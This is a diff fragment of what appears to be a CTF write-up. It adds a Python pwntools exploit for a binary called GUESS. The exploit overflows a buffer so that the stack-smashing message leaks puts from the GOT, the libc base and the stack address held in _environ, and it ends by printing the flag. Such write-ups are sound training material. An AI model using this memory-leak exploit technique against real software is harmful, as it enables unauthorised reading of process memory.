@@ -87,6 +87,43 @@ payload = ’a' * 0x128 + p64(stack_base + 0x30)
 exp：
 
 ```
+from pwn import * 
+
+
+p = process('./GUESS') 
+elf = ELF('./GUESS')
+libc = elf.libc
+
+puts_got = elf.got['puts']
+p.recvuntil('guessing flag') 
+payload = 'a'*0x128 + p64(puts_got) 
+p.sendline(payload) 
+p.recvuntil('detected ***: ') 
+puts_addr = u64(p.recv(6).ljust(8,'\x00')) 
+
+
+offset_puts = libc.symbols['puts'] 
+libc_base = puts_addr - offset_puts 
+
+offset__environ = libc.symbols['_environ']
+_environ_addr = libc_base + offset__environ 
+
+p.recvuntil('guessing flag') 
+payload = 'a'*0x128 + p64(_environ_addr) 
+p.sendline(payload) 
+p.recvuntil('detected ***: ') 
+stack_base = u64(p.recv(6).ljust(8,'\x00')) - 0x198 
+
+flag_addr = stack_base + 0x30 
+p.recvuntil('guessing flag') 
+payload = 'a'*0x128 + p64(flag_addr) 
+p.sendline(payload) 
+p.recvuntil('detected ***: ') 
+flag = p.recvuntil('}') 
+print flag 
+p.interactive()
+
+
 
 ```
 
